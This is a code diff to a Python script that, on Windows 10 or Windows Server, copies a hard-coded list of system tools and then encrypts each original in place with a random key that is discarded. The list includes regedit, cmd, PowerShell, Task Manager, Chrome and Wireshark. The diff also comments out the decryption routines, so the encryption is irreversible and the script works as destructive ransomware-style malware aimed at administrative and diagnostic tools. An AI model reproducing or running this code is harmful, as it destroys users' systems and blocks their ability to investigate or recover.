@@ -1,33 +1,31 @@
 import os 
 from cryptography.fernet import Fernet
-import ctypes
+import platform
+import shutil
 
-def search_and_save_files(root_directory, output_file):
-    file_dict = {}
-    
-    for foldername, subfolders, filenames in os.walk(root_directory):
-        for filename in filenames:
-            if filename.endswith('.exe'):
-                file_path = os.path.join(foldername, filename)
-                file_dict[filename] = file_path
+COPYFOLDER = 'C:\\'
+BLACKLIST_WINTEN = ['C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\calc.exe','C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\control.exe', 'C:\\Windows\\System32\\find.exe', 'C:\\Windows\\System32\\gpupdate.exe', 'C:\\Windows\\System32\\ipconfig.exe', 'C:\\Windows\\System32\\mmc.exe', 'C:\\Windows\\System32\\msconfig.exe', 'C:\\Windows\\System32\\notepad.exe', 'C:\\Windows\\System32\\perfmon.msc', 'C:\\Windows\\System32\\PING.exe', 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\System32\\taskkill', 'C:\\Windows\\System32\\Taskmgr.exe', 'C:\\Windows\\System32\\taskschd.msc', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Local App Data\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Wireshark\\Wireshark.exe']
+BLACKLIST_WINSERV = ['C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\ServerManager.exe', 'C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\calc.exe','C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\control.exe', 'C:\\Windows\\System32\\find.exe', 'C:\\Windows\\System32\\gpupdate.exe', 'C:\\Windows\\System32\\ipconfig.exe', 'C:\\Windows\\System32\\mmc.exe', 'C:\\Windows\\System32\\msconfig.exe', 'C:\\Windows\\System32\\notepad.exe', 'C:\\Windows\\System32\\perfmon.msc', 'C:\\Windows\\System32\\PING.exe', 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\System32\\taskkill', 'C:\\Windows\\System32\\Taskmgr.exe', 'C:\\Windows\\System32\\taskschd.msc', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Local App Data\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Wireshark\\Wireshark.exe']
 
-    with open(output_file, 'w') as f:
-        for filename, file_path in file_dict.items():
-            f.write(f"{filename}: {file_path}\n")
+def check_windows_version():
+    system_info = platform.system()
+    if system_info == "Windows":
+        version_info = platform.version()
+        if "10.0" in version_info:
+            return "Windows 10"
+        elif "Server" in version_info:
+            return "Windows Server"
+        else:
+            return "Unknown Windows Version"
+    else:
+        return "Not a Windows System"
 
-def read_dictionary_from_file(filename, delimiter=':'):
-    data = {}
+def copy_file(source_path, destination_path):
     try:
-        with open(filename, 'r') as file:
-            for line in file:
-                line = line.strip()
-                if line:
-                    key, value = line.split(delimiter, 1)
-                    data[key.strip()] = value.strip()
-        return data
-    except FileNotFoundError:
-        print(f"File '{filename}' not found.")
-        return None
+        shutil.copy2(source_path, destination_path)
+        print("File copied successfully.")
+    except Exception as e:
+        print(f"Error: {e}")
 
 def generate_key():
     return Fernet.generate_key()
@@ -41,31 +39,39 @@ def encrypt_file(file_path, key):
         file.write(encrypted_data)
 
 # Encrypt all files in the dictionary using the provided key
-def encrypt_files(file_dict, encryption_key):
-    for file_path in file_dict.values():
-        encrypt_file(file_path, encryption_key)
+#def encrypt_files(file_dict, encryption_key):
+#    for file_path in file_dict.values():
+#        encrypt_file(file_path, encryption_key)
 
-def decrypt_file(file_path, key):
-    with open(file_path, 'rb') as file:
-        encrypted_data = file.read()
-    fernet = Fernet(key)
-    decrypted_data = fernet.decrypt(encrypted_data)
-    with open(file_path, 'wb') as file:
-        file.write(decrypted_data)
+#def decrypt_file(file_path, key):
+#    with open(file_path, 'rb') as file:
+#        encrypted_data = file.read()
+#    fernet = Fernet(key)
+#    decrypted_data = fernet.decrypt(encrypted_data)
+#    with open(file_path, 'wb') as file:
+#       file.write(decrypted_data)
 
 # Decrypt all files in the dictionary using the provided key
-def decrypt_files(file_dict, encryption_key):
-    for file_path in file_dict.values():
-        decrypt_file(file_path, encryption_key)
+#def decrypt_files(file_dict, encryption_key):
+#    for file_path in file_dict.values():
+#        decrypt_file(file_path, encryption_key)
 
 
 if __name__ == "__main__":
-    root_directory = "C:\\Users"
-    output_file = 'file_list.txt'  # Replace with the desired output file name
-    
-    #search_and_save_files(root_directory, output_file)
-    #print("File list saved to", output_file)
-    #dictionary = read_dictionary_from_file(output_file)
-    #if dictionary:
-    #    print("Dictionary read successfully:")
-    #    print(dictionary)
+    version = check_windows_version()
+    if version == "Windows 10":
+        for file in BLACKLIST_WINTEN:
+            try:
+                copy_file(file, COPYFOLDER)
+                encrypt_file(file, generate_key())
+            except Exception:
+                continue
+    elif version == "Windows Server":
+        for file in BLACKLIST_WINSERV:
+            try:
+                copy_file(file, COPYFOLDER)
+                encrypt_file(file, generate_key())
+            except Exception:
+                continue
+    else: 
+        exit()
